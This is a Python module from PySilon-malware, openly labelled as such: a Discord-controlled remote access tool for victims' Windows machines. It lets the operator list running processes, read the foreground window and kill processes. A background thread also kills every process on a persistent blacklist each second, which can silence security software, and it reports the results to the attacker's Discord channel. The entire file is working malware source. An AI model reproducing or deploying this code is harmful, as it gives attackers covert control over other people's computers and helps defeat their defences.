#<imports>
from psutil import process_iter, Process
import resources.modules.misc as pysilon_misc
import subprocess
import win32process
import win32gui
import asyncio
import os
import sys
import discord
#</imports>

#<commands>
@client.command(name="tasklist")
async def list_of_processes(ctx):
    global processes_list
    processes_messages = []
    processes = []
    for proc in process_iter():
        processes.append(proc.name())
    processes.sort(key=str.lower)
    how_many, temp = 1, processes[0]; processes.pop(0)
    for i in processes:
        if temp == i: how_many += 1
        else:
            if how_many == 1: processes_list.append('``' + temp + '``')
            else: processes_list.append('``' + temp + '``   [x' + str(how_many) + ']'); how_many = 1
            temp = i
    total_processes = len(processes)
    processes = ''
    tasklist_msg = await ctx.send('```Processes at ' + pysilon_misc.current_time() + ' requested by ' + str(ctx.message.author) + '```')
    processes_messages.append(tasklist_msg)
    for proc in range(1, len(processes_list)):
        if len(processes) < 1800:
            processes = processes + '\n**' + str(proc) + ') **' + str(processes_list[proc])
        else:
            processes += '\n**' + str(proc) + ') **' + str(processes_list[proc])
            tasklist_msg = await ctx.send(processes)
            processes_messages.append(tasklist_msg)
            processes = ''
    tasklist_msg = await ctx.send(processes + '\n Total processes:** ' + str(total_processes) + '**\n```If you want to kill a process, type .kill <process-number>```')
    processes_messages.append(tasklist_msg)

@client.command(name="foreground")
async def get_foreground_tast(ctx):
    await ctx.message.delete()
    foreground_process = active_window_process_name()
    if foreground_process == None:
        embed = discord.Embed(title="📛 Error",description='```Failed to get foreground window process name.```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title=str(foreground_process),description=f'```You can kill it with -> .kill {foreground_process}```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

@client.command(name="kill")
async def kill_running_process(ctx, argument=None):
    global processes_list
    await ctx.message.delete()
    if argument == None:
        embed = discord.Embed(title="📛 Error",description='```Syntax: .kill <process-name-or-ID>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
    elif check_int(argument):
        if len(processes_list) > 10:
            if int(argument) < len(processes_list) and int(argument) > 0:
                reaction_msg = await ctx.send('```Do you really want to kill process: ' + processes_list[int(argument)].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```')
                process_to_kill = [processes_list[int(argument)].replace('`', ''), False]
                await reaction_msg.add_reaction('✅')
                await reaction_msg.add_reaction('❌')

                def kill_proc_confirm(reaction, user):
                    return str(reaction.emoji) in ['✅', '❌'] and user == ctx.author
        
                try:
                    reaction, user = await client.wait_for('reaction_add', check=kill_proc_confirm)
                    if str(reaction.emoji) == '✅':
                        await reaction.message.delete()
                        try:
                            process_name = process_to_kill[0]
                            if process_name[-1] == ']':
                                process_name = process_name[::-1]
                                for i in range(len(process_name)):
                                    if process_name[i] == '[':
                                        process_name = process_name[i+4:]
                                        break
                                process_name = process_name[::-1] 
                        except Exception as e: 
                            embed = discord.Embed(title="📛 Error",description=f'```Error while parsing the process name...\n' + str(e) + '```', colour=discord.Colour.red())
                            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            await reaction.message.channel.send(embed=embed)
                        try:
                            killed_processes = []
                            for proc in process_iter():
                                if proc.name() == process_name:
                                    proc.kill()
                                    killed_processes.append(proc.name())
                            processes_killed = ''
                            for i in killed_processes:
                                processes_killed = processes_killed + '\n• ' + str(i)
                            embed = discord.Embed(title="🟢 Success",description=f'```Processes killed by ' + str(user) + ' at ' + pysilon_misc.current_time() + processes_killed + '```', colour=discord.Colour.green())
                            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            await reaction.message.channel.send(embed=embed)
                        except Exception as e:
                            embed = discord.Embed(title="📛 Error",description='```Error while killing processes...\n' + str(e) + '```', colour=discord.Colour.red())
                            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            await reaction.message.channel.send(embed=embed)
                    else: return
                except asyncio.TimeoutError: await ctx.send("```❗ Reaction listener has timed out.```")
            else:
                embed = discord.Embed(title="📛 Error",description="```There isn't any process with that index. Range of process indexes is 1-" + str(len(processes_list)-1) + '```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="📛 Error",description='```You need to generate the processes list to use this feature\n.show processes```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    elif argument.lower() in [proc.name().lower() for proc in process_iter()]:
        stdout = pysilon_misc.force_decode(subprocess.run(f'taskkill /f /IM {argument.lower()} /t', capture_output=True, shell=True).stdout).strip()
        await asyncio.sleep(1)
        if argument.lower() not in [proc.name().lower() for proc in process_iter()]:
            embed = discord.Embed(title="🟢 Success",description=f'```Successfully killed {argument.lower()}```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="📛 Error",description=f'```Tried to kill {argument} but it\'s still running...```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="📛 Error",description='```Invalid process name/ID. You can view all running processes by typing:\n.show processes```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)

@client.command(name="blacklist")
async def blacklist_process(ctx, argument=None):
    await ctx.message.delete()
    if argument == None:
        embed = discord.Embed(title="📛 Error",description='```Syntax: .blacklist <process-name>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
    else:
        if not os.path.exists(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln'): 
            with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'w', encoding='utf-8'): pass
        with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
            disabled_processes_list = disabled_processes.readlines()
        for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
        if argument not in disabled_processes_list:
            disabled_processes_list.append(argument)
            with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                disabled_processes.write('\n'.join(disabled_processes_list))
            embed = discord.Embed(title="🟢 Success",description=f'```{argument} has been added to process blacklist```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="📛 Error",description='```This process is already blacklisted, so there\'s nothing to disable```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)

@client.command(name="whitelist")
async def whitelist_process(ctx, argument=None):
    await ctx.message.delete()
    if argument == None:
        embed = discord.Embed(title="📛 Error",description='```Syntax: .whitelist <process-name>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
    else:
        if not os.path.exists(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln'): 
            with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'w', encoding='utf-8'): pass
        with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
            disabled_processes_list = disabled_processes.readlines()
        for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
        if argument in disabled_processes_list:
            disabled_processes_list.pop(disabled_processes_list.index(argument))
            with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                disabled_processes.write('\n'.join(disabled_processes_list))
            embed = discord.Embed(title="🟢 Success",description=f'```{argument} has been removed from process blacklist```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="📛 Error",description='```This process is not blacklisted```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
#</commands>

#<engine>
def process_blacklister():
    global embeds_to_send
    while True:
        if os.path.exists(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln'):
            with open(f'{os.path.dirname(sys.executable)}\\disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                process_blacklist = disabled_processes.readlines()
            for x, y in enumerate(process_blacklist): process_blacklist[x] = y.replace('\n', '')
            for process in process_blacklist:
                if process.lower() in [proc.name().lower() for proc in process_iter()]:
                    stdout = pysilon_misc.force_decode(subprocess.run(f'taskkill /f /IM {process} /t', capture_output=True, shell=True).stdout).strip()
                    time.sleep(1)
                    if process.lower() not in [proc.name().lower() for proc in process_iter()]:
                        embed = discord.Embed(title="🟢 Success", description=f'```Process Blacklister killed {process}```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        embeds_to_send.append([channel_ids['main'], embed])
                    else:
                        embed = discord.Embed(title="📛 Error",description=f'```Process Blacklister tried to kill {process} but it\'s still running...```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        embeds_to_send.append([channel_ids['main'], embed])
        time.sleep(1)

def active_window_process_name():
    try:
        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
        return(Process(pid[-1]).name())
    except: return None

def check_int(to_check):
    try:
        asd = int(to_check) + 1
        return True
    except: return False
#</engine>

#<start>
processes_list = []
embeds_to_send = []
threading.Thread(target=process_blacklister).start()
#</start>